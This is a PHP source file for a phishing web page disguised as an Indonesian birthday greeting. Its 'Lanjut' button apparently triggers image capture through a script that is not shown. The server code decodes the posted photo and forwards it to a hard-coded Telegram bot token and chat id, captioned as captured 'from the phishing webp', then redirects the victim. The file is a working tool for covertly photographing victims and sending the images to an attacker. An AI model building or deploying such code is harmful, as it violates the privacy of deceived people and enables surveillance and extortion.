// index.php
<?php
// Check if the form has been submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the captured image data
    $imageData = $_POST['imageData'];

    // Decode the image data
    $image = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $imageData));

    // Save the image to a file
    $fileName = 'captured_image_' . time() . '.png';
    file_put_contents($fileName, $image);

    // Send the image to the Telegram bot
    $botToken = '7127418677:AAFvAzvMPvpI2YkFa9jsCufKgkudAvnZGEg';
    $chatId = '6285925986868';
    $message = 'New image captured from the phishing webp';

    // Prepare the request URL
    $url = 'https://api.telegram.org/bot' . $botToken . '/sendPhoto';

    // Prepare the request data
    $data = [
        'chat_id' => $chatId,
        'caption' => $message,
        'photo' => curl_file_create($fileName, 'image/png'),
    ];

    // Send the POST request
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    // Remove the temporary image file
    unlink($fileName);

    // Redirect the user to a thank you page
    header('Location: thankyou.php');
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>🥳 Selamat Ulang Tahun</title>
    <link rel="stylesheet" type="text/css" href="styles.css">
</head>
<body>
    <div class="container">
        <h1>Halo ^•^</h1>
        <p>Selamat ulang tahun 😊.</p>
        <p>Silahkan klik "LANJUT" untuk melanjutkan ini😁</p>
        <button id="captureButton">Lanjut</button>
    </div>

    <script src="script.js"></script>
</body>
</html>